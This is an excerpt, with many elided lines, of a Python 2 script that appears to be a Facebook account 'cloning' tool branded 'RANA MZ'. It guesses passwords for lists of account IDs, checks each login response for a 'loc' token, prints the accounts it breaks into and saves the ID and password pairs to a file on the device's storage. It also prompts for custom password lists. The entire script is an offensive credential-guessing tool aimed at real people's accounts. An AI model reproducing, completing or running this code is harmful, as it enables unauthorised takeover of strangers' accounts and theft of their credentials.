...
def menu():
    ...
    print '\x1b[1;92m[4] Create Your Own File'
...
def crack():
    ...
    os.system('clear')
    print logo
    print '\x1b[1;93m Auto pass Cloning \x1b[1;91m'
    print 47 * '-'
...
def mz():
    ...
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;93m Auto pass public Cloning \x1b[1;91m'
        print 47 * '-'
        ...
        try:
            ...
            os.system('clear')
            print logo
            print '\x1b[1;93m Auto pass public Cloning'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[RANA MZ - SUCC3SSFUL] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[RANA MZ - SUCC3SSFUL] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[RANA MZ - SUCC3SSFUL] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[RANA MZ - SUCC3SSFUL] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[RANA MZ - SUCC3SSFUL] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                ...
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[RANA MZ - SUCC3SSFUL] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[RANA MZ - SUCC3SSFUL] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        ...
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[RANA MZ - SUCC3SSFUL] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            ...
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\x1b[1;92m[RANA MZ - SUCC3SSFUL] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                ...
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[RANA MZ - SUCC3SSFUL] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/MZ_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
...
def c_s():
    ...
    if mz == '1':
        ...
        pass14 = raw_input(' \x1b[1;92m[14]Password: ')
        pass15 = raw_input(' \x1b[1;92m[15]Password: ')
        ...
        pass14 = raw_input(' \x1b[1;92m[14]Password: ')
        pass15 = raw_input(' \x1b[1;92m[15]Password: ')
        pas16 = raw_input(' \x1b[1;92m[16]Password: ')
        pass17 = raw_input(' \x1b[1;92m[17]Password: ')
        pass18 = raw_input(' \x1b[1;92m[18]Password: ')
        try:
            idlist = raw_input('[+] File Name: ')
